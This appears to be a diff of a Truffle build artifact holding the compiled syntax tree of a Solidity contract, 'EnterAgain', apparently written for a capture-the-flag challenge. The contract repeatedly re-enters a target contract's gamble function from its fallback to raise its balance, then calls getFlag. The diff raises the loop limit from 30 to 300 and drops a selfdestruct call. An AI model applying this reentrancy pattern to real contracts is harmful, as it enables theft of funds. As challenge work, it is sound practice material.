                     "nodeType": "Block",
-                    "src": "619:42:1",
+                    "src": "622:42:1",
                     "statements": [
                       {
                         "expression": {
@@ -1159,32 +1100,32 @@
                             "argumentTypes": [],
                             "expression": {
                               "argumentTypes": null,
-                              "id": 376,
+                              "id": 372,
                               "name": "entrance",
                               "nodeType": "Identifier",
                               "overloadedDeclarations": [],
-                              "referencedDeclaration": 365,
-                              "src": "633:8:1",
+                              "referencedDeclaration": 361,
+                              "src": "636:8:1",
                               "typeDescriptions": {
-                                "typeIdentifier": "t_contract$_Entrance_$579",
+                                "typeIdentifier": "t_contract$_Entrance_$575",
                                 "typeString": "contract Entrance"
                               }
                             },
-                            "id": 378,
+                            "id": 374,
                             "isConstant": false,
                             "isLValue": false,
                             "isPure": false,
                             "lValueRequested": false,
                             "memberName": "gamble",
                             "nodeType": "MemberAccess",
-                            "referencedDeclaration": 555,
-                            "src": "633:15:1",
+                            "referencedDeclaration": 551,
+                            "src": "636:15:1",
                             "typeDescriptions": {
                               "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                               "typeString": "function () external"
                             }
                           },
-                          "id": 379,
+                          "id": 375,
                           "isConstant": false,
                           "isLValue": false,
                           "isPure": false,
@@ -1192,15 +1133,15 @@
                           "lValueRequested": false,
                           "names": [],
                           "nodeType": "FunctionCall",
-                          "src": "633:17:1",
+                          "src": "636:17:1",
                           "typeDescriptions": {
                             "typeIdentifier": "t_tuple$__$",
                             "typeString": "tuple()"
                           }
                         },
-                        "id": 380,
+                        "id": 376,
                         "nodeType": "ExpressionStatement",
-                        "src": "633:17:1"
+                        "src": "636:17:1"
                       }
                     ]
                   }
@@ -1208,7 +1149,7 @@
               ]
             },
             "documentation": null,
-            "id": 384,
+            "id": 380,
             "implemented": true,
             "isConstructor": false,
             "isDeclaredConst": false,
@@ -1216,39 +1157,39 @@
             "name": "",
             "nodeType": "FunctionDefinition",
             "parameters": {
-              "id": 362,
+              "id": 358,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "531:2:1"
+              "src": "533:2:1"
             },
             "payable": false,
             "returnParameters": {
-              "id": 363,
+              "id": 359,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "534:0:1"
+              "src": "536:0:1"
             },
-            "scope": 385,
-            "src": "523:144:1",
+            "scope": 381,
+            "src": "525:145:1",
             "stateMutability": "nonpayable",
             "superFunction": null,
             "visibility": "public"
           }
         ],
-        "scope": 386,
-        "src": "85:584:1"
+        "scope": 382,
+        "src": "85:587:1"
       }
     ],
-    "src": "0:670:1"
+    "src": "0:673:1"
   },
   "legacyAST": {
     "absolutePath": "/Users/linkeex/Projects/ccc/solidity/contracts/enteragain.sol",
     "exportedSymbols": {
       "EnterAgain": [
-        385
+        381
       ]
     },
-    "id": 386,
+    "id": 382,
     "nodeType": "SourceUnit",
     "nodes": [
       {
@@ -1270,8 +1211,8 @@
         "file": "./entrance.sol",
         "id": 295,
         "nodeType": "ImportDirective",
-        "scope": 386,
-        "sourceUnit": 580,
+        "scope": 382,
+        "sourceUnit": 576,
         "src": "34:24:1",
         "symbolAliases": [],
         "unitAlias": ""
@@ -1281,7 +1222,7 @@
         "file": "./SafeMath.sol",
         "id": 296,
         "nodeType": "ImportDirective",
-        "scope": 386,
+        "scope": 382,
         "sourceUnit": 293,
         "src": "59:24:1",
         "symbolAliases": [],
@@ -1293,9 +1234,9 @@
         "contractKind": "contract",
         "documentation": null,
         "fullyImplemented": true,
-        "id": 385,
+        "id": 381,
         "linearizedBaseContracts": [
-          385
+          381
         ],
         "name": "EnterAgain",
         "nodeType": "ContractDefinition",
@@ -1323,7 +1264,7 @@
             "id": 301,
             "name": "counter",
             "nodeType": "VariableDeclaration",
-            "scope": 385,
+            "scope": 381,
             "src": "138:19:1",
             "stateVariable": true,
             "storageLocation": "default",
@@ -1366,7 +1307,7 @@
             "id": 303,
             "name": "a",
             "nodeType": "VariableDeclaration",
-            "scope": 385,
+            "scope": 381,
             "src": "163:9:1",
             "stateVariable": true,
             "storageLocation": "default",
@@ -1489,7 +1430,7 @@
               "parameters": [],
               "src": "203:0:1"
             },
-            "scope": 385,
+            "scope": 381,
             "src": "179:47:1",
             "stateMutability": "nonpayable",
             "superFunction": null,
@@ -1497,9 +1438,9 @@
           },
           {
             "body": {
-              "id": 360,
+              "id": 356,
               "nodeType": "Block",
-              "src": "249:268:1",
+              "src": "249:270:1",
               "statements": [
                 {
                   "assignments": [
@@ -1511,7 +1452,7 @@
                       "id": 317,
                       "name": "b",
                       "nodeType": "VariableDeclaration",
-                      "scope": 361,
+                      "scope": 357,
                       "src": "259:6:1",
                       "stateVariable": false,
                       "storageLocation": "default",
@@ -1542,7 +1483,7 @@
                       "name": "block",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
-                      "referencedDeclaration": 584,
+                      "referencedDeclaration": 580,
                       "src": "268:5:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_magic_block",
@@ -1728,10 +1669,10 @@
                       "name": "require",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [
-                        597,
-                        598
+                        593,
+                        594
                       ],
-                      "referencedDeclaration": 598,
+                      "referencedDeclaration": 594,
                       "src": "290:7:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
@@ -1766,12 +1707,12 @@
                       "id": 333,
                       "name": "entrance",
                       "nodeType": "VariableDeclaration",
-                      "scope": 361,
+                      "scope": 357,
                       "src": "346:17:1",
                       "stateVariable": false,
                       "storageLocation": "default",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_Entrance_$579",
+                        "typeIdentifier": "t_contract$_Entrance_$575",
                         "typeString": "contract Entrance"
                       },
                       "typeName": {
@@ -1779,10 +1720,10 @@
                         "id": 332,
                         "name": "Entrance",
                         "nodeType": "UserDefinedTypeName",
-                        "referencedDeclaration": 579,
+                        "referencedDeclaration": 575,
                         "src": "346:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -1819,10 +1760,10 @@
                       "name": "Entrance",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
-                      "referencedDeclaration": 579,
+                      "referencedDeclaration": 575,
                       "src": "366:8:1",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_type$_t_contract$_Entrance_$579_$",
+                        "typeIdentifier": "t_type$_t_contract$_Entrance_$575_$",
                         "typeString": "type(contract Entrance)"
                       }
                     },
@@ -1836,7 +1777,7 @@
                     "nodeType": "FunctionCall",
                     "src": "366:11:1",
                     "typeDescriptions": {
-                      "typeIdentifier": "t_contract$_Entrance_$579",
+                      "typeIdentifier": "t_contract$_Entrance_$575",
                       "typeString": "contract Entrance"
                     }
                   },
@@ -1882,7 +1823,7 @@
                         "referencedDeclaration": 333,
                         "src": "387:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -1893,7 +1834,7 @@
                       "lValueRequested": false,
                       "memberName": "enter",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 468,
+                      "referencedDeclaration": 464,
                       "src": "387:14:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
@@ -1933,7 +1874,7 @@
                         "referencedDeclaration": 333,
                         "src": "414:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -1944,7 +1885,7 @@
                       "lValueRequested": false,
                       "memberName": "gamble",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 555,
+                      "referencedDeclaration": 551,
                       "src": "414:15:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
@@ -2030,7 +1971,7 @@
                         "referencedDeclaration": 333,
                         "src": "441:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -2041,7 +1982,7 @@
                       "lValueRequested": false,
                       "memberName": "getFlag",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 578,
+                      "referencedDeclaration": 574,
                       "src": "441:16:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$__$",
@@ -2065,70 +2006,11 @@
                   "id": 355,
                   "nodeType": "ExpressionStatement",
                   "src": "441:42:1"
-                },
-                {
-                  "expression": {
-                    "argumentTypes": null,
-                    "arguments": [
-                      {
-                        "argumentTypes": null,
-                        "hexValue": "307830",
-                        "id": 357,
-                        "isConstant": false,
-                        "isLValue": false,
-                        "isPure": true,
-                        "kind": "number",
-                        "lValueRequested": false,
-                        "nodeType": "Literal",
-                        "src": "506:3:1",
-                        "subdenomination": null,
-                        "typeDescriptions": {
-                          "typeIdentifier": "t_rational_0_by_1",
-                          "typeString": "int_const 0"
-                        },
-                        "value": "0x0"
-                      }
-                    ],
-                    "expression": {
-                      "argumentTypes": [
-                        {
-                          "typeIdentifier": "t_rational_0_by_1",
-                          "typeString": "int_const 0"
-                        }
-                      ],
-                      "id": 356,
-                      "name": "selfdestruct",
-                      "nodeType": "Identifier",
-                      "overloadedDeclarations": [],
-                      "referencedDeclaration": 602,
-                      "src": "493:12:1",
-                      "typeDescriptions": {
-                        "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_$returns$__$",
-                        "typeString": "function (address)"
-                      }
-                    },
-                    "id": 358,
-                    "isConstant": false,
-                    "isLValue": false,
-                    "isPure": false,
-                    "kind": "functionCall",
-                    "lValueRequested": false,
-                    "names": [],
-                    "nodeType": "FunctionCall",
-                    "src": "493:17:1",
-                    "typeDescriptions": {
-                      "typeIdentifier": "t_tuple$__$",
-                      "typeString": "tuple()"
-                    }
-                  },
-                  "id": 359,
-                  "nodeType": "ExpressionStatement",
-                  "src": "493:17:1"
                 }
               ]
             },
             "documentation": null,
-            "id": 361,
+            "id": 357,
             "implemented": true,
             "isConstructor": false,
             "isDeclaredConst": false,
@@ -2148,45 +2030,45 @@
               "parameters": [],
               "src": "249:0:1"
             },
-            "scope": 385,
-            "src": "232:285:1",
+            "scope": 381,
+            "src": "232:287:1",
             "stateMutability": "nonpayable",
             "superFunction": null,
             "visibility": "public"
           },
           {
             "body": {
-              "id": 383,
+              "id": 379,
               "nodeType": "Block",
-              "src": "534:133:1",
+              "src": "536:134:1",
               "statements": [
                 {
                   "assignments": [
-                    365
+                    361
                   ],
                   "declarations": [
                     {
                       "constant": false,
-                      "id": 365,
+                      "id": 361,
                       "name": "entrance",
                       "nodeType": "VariableDeclaration",
-                      "scope": 384,
-                      "src": "544:17:1",
+                      "scope": 380,
+                      "src": "546:17:1",
                       "stateVariable": false,
                       "storageLocation": "default",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_Entrance_$579",
+                        "typeIdentifier": "t_contract$_Entrance_$575",
                         "typeString": "contract Entrance"
                       },
                       "typeName": {
                         "contractScope": null,
-                        "id": 364,
+                        "id": 360,
                         "name": "Entrance",
                         "nodeType": "UserDefinedTypeName",
-                        "referencedDeclaration": 579,
-                        "src": "544:8:1",
+                        "referencedDeclaration": 575,
+                        "src": "546:8:1",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Entrance_$579",
+                          "typeIdentifier": "t_contract$_Entrance_$575",
                           "typeString": "contract Entrance"
                         }
                       },
@@ -2194,18 +2076,18 @@
                       "visibility": "internal"
                     }
                   ],
-                  "id": 369,
+                  "id": 365,
                   "initialValue": {
                     "argumentTypes": null,
                     "arguments": [
                       {
                         "argumentTypes": null,
-                        "id": 367,
+                        "id": 363,
                         "name": "a",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
                         "referencedDeclaration": 303,
-                        "src": "573:1:1",
+                        "src": "575:1:1",
                         "typeDescriptions": {
                           "typeIdentifier": "t_address",
                           "typeString": "address"
@@ -2219,18 +2101,18 @@
                           "typeString": "address"
                         }
                       ],
-                      "id": 366,
+                      "id": 362,
                       "name": "Entrance",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
-                      "referencedDeclaration": 579,
-                      "src": "564:8:1",
+                      "referencedDeclaration": 575,
+                      "src": "566:8:1",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_type$_t_contract$_Entrance_$579_$",
+                        "typeIdentifier": "t_type$_t_contract$_Entrance_$575_$",
                         "typeString": "type(contract Entrance)"
                       }
                     },
-                    "id": 368,
+                    "id": 364,
                     "isConstant": false,
                     "isLValue": false,
                     "isPure": false,
@@ -2238,14 +2120,14 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "564:11:1",
+                    "src": "566:11:1",
                     "typeDescriptions": {
-                      "typeIdentifier": "t_contract$_Entrance_$579",
+                      "typeIdentifier": "t_contract$_Entrance_$575",
                       "typeString": "contract Entrance"
                     }
                   },
                   "nodeType": "VariableDeclarationStatement",
-                  "src": "544:31:1"
+                  "src": "546:31:1"
                 },
                 {
                   "condition": {
@@ -2254,7 +2136,7 @@
                       "typeIdentifier": "t_uint256",
                       "typeString": "uint256"
                     },
-                    "id": 375,
+                    "id": 371,
                     "isConstant": false,
                     "isLValue": false,
                     "isPure": false,
@@ -2264,14 +2146,14 @@
                       "arguments": [
                         {
                           "argumentTypes": null,
-                          "id": 372,
+                          "id": 368,
                           "name": "this",
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
-                          "referencedDeclaration": 611,
-                          "src": "606:4:1",
+                          "referencedDeclaration": 607,
+                          "src": "608:4:1",
                           "typeDescriptions": {
-                            "typeIdentifier": "t_contract$_EnterAgain_$385",
+                            "typeIdentifier": "t_contract$_EnterAgain_$381",
                             "typeString": "contract EnterAgain"
                           }
                         }
@@ -2279,38 +2161,38 @@
                       "expression": {
                         "argumentTypes": [
                           {
-                            "typeIdentifier": "t_contract$_EnterAgain_$385",
+                            "typeIdentifier": "t_contract$_EnterAgain_$381",
                             "typeString": "contract EnterAgain"
                           }
                         ],
                         "expression": {
                           "argumentTypes": null,
-                          "id": 370,
+                          "id": 366,
                           "name": "entrance",
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
-                          "referencedDeclaration": 365,
-                          "src": "588:8:1",
+                          "referencedDeclaration": 361,
+                          "src": "590:8:1",
                           "typeDescriptions": {
-                            "typeIdentifier": "t_contract$_Entrance_$579",
+                            "typeIdentifier": "t_contract$_Entrance_$575",
                             "typeString": "contract Entrance"
                           }
                         },
-                        "id": 371,
+                        "id": 367,
                         "isConstant": false,
                         "isLValue": false,
                         "isPure": false,
                         "lValueRequested": false,
                         "memberName": "balances",
                         "nodeType": "MemberAccess",
-                        "referencedDeclaration": 394,
-                        "src": "588:17:1",
+                        "referencedDeclaration": 390,
+                        "src": "590:17:1",
                         "typeDescriptions": {
                           "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                           "typeString": "function (address) view external returns (uint256)"
                         }
                       },
-                      "id": 373,
+                      "id": 369,
                       "isConstant": false,
                       "isLValue": false,
                       "isPure": false,
@@ -2318,7 +2200,7 @@
                       "lValueRequested": false,
                       "names": [],
                       "nodeType": "FunctionCall",
-                      "src": "588:23:1",
+                      "src": "590:23:1",
                       "typeDescriptions": {
                         "typeIdentifier": "t_uint256",
                         "typeString": "uint256"
@@ -2328,36 +2210,36 @@
                     "operator": "<=",
                     "rightExpression": {
                       "argumentTypes": null,
-                      "hexValue": "3330",
-                      "id": 374,
+                      "hexValue": "333030",
+                      "id": 370,
                       "isConstant": false,
                       "isLValue": false,
                       "isPure": true,
                       "kind": "number",
                       "lValueRequested": false,
                       "nodeType": "Literal",
-                      "src": "615:2:1",
+                      "src": "617:3:1",
                       "subdenomination": null,
                       "typeDescriptions": {
-                        "typeIdentifier": "t_rational_30_by_1",
-                        "typeString": "int_const 30"
+                        "typeIdentifier": "t_rational_300_by_1",
+                        "typeString": "int_const 300"
                       },
-                      "value": "30"
+                      "value": "300"
                     },
-                    "src": "588:29:1",
+                    "src": "590:30:1",
                     "typeDescriptions": {
                       "typeIdentifier": "t_bool",
                       "typeString": "bool"
                     }
                   },
                   "falseBody": null,
-                  "id": 382,
+                  "id": 378,
                   "nodeType": "IfStatement",
-                  "src": "585:76:1",
+                  "src": "587:77:1",
                   "trueBody": {
-                    "id": 381,
+                    "id": 377,
                     "nodeType": "Block",
-                    "src": "619:42:1",
+                    "src": "622:42:1",
                     "statements": [
                       {
                         "expression": {
@@ -2367,32 +2249,32 @@
                             "argumentTypes": [],
                             "expression": {
                               "argumentTypes": null,
-                              "id": 376,
+                              "id": 372,
                               "name": "entrance",
                               "nodeType": "Identifier",
                               "overloadedDeclarations": [],
-                              "referencedDeclaration": 365,
-                              "src": "633:8:1",
+                              "referencedDeclaration": 361,
+                              "src": "636:8:1",
                               "typeDescriptions": {
-                                "typeIdentifier": "t_contract$_Entrance_$579",
+                                "typeIdentifier": "t_contract$_Entrance_$575",
                                 "typeString": "contract Entrance"
                               }
                             },
-                            "id": 378,
+                            "id": 374,
                             "isConstant": false,
                             "isLValue": false,
                             "isPure": false,
                             "lValueRequested": false,
                             "memberName": "gamble",
                             "nodeType": "MemberAccess",
-                            "referencedDeclaration": 555,
-                            "src": "633:15:1",
+                            "referencedDeclaration": 551,
+                            "src": "636:15:1",
                             "typeDescriptions": {
                               "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                               "typeString": "function () external"
                             }
                           },
-                          "id": 379,
+                          "id": 375,
                           "isConstant": false,
                           "isLValue": false,
                           "isPure": false,
@@ -2400,15 +2282,15 @@
                           "lValueRequested": false,
                           "names": [],
                           "nodeType": "FunctionCall",
-                          "src": "633:17:1",
+                          "src": "636:17:1",
                           "typeDescriptions": {
                             "typeIdentifier": "t_tuple$__$",
                             "typeString": "tuple()"
                           }
                         },
-                        "id": 380,
+                        "id": 376,
                         "nodeType": "ExpressionStatement",
-                        "src": "633:17:1"
+                        "src": "636:17:1"
                       }
                     ]
                   }
@@ -2416,7 +2298,7 @@
               ]
             },
             "documentation": null,
-            "id": 384,
+            "id": 380,
             "implemented": true,
             "isConstructor": false,
             "isDeclaredConst": false,
@@ -2424,30 +2306,30 @@
             "name": "",
             "nodeType": "FunctionDefinition",
             "parameters": {
-              "id": 362,
+              "id": 358,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "531:2:1"
+              "src": "533:2:1"
             },
             "payable": false,
             "returnParameters": {
-              "id": 363,
+              "id": 359,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "534:0:1"
+              "src": "536:0:1"
             },
-            "scope": 385,
-            "src": "523:144:1",
+            "scope": 381,
+            "src": "525:145:1",
             "stateMutability": "nonpayable",
             "superFunction": null,
             "visibility": "public"
           }
         ],
-        "scope": 386,
-        "src": "85:584:1"
+        "scope": 382,
+        "src": "85:587:1"
       }
     ],
-    "src": "0:670:1"
+    "src": "0:673:1"
   },
   "compiler": {
     "name": "solc",
@@ -2458,9 +2340,9 @@
       "events": {},
       "links": {},
       "address": "0x7d39b75086ad2e5ea5c3aa49fcf5c2e3b6de5ced",
-      "transactionHash": "0xface54e93e53c47cfe5010ed53cbc0e4a6913eed8b345fd742edb31886367c49"
+      "transactionHash": "0x570a6d9fe6b53e53abdcec3d9a3948dcec1edc58696e346ca5154b25bf0d097f"
     }
   },
   "schemaVersion": "2.0.1",
-  "updatedAt": "2018-12-30T02:10:38.246Z"
+  "updatedAt": "2018-12-30T02:44:26.175Z"
 }
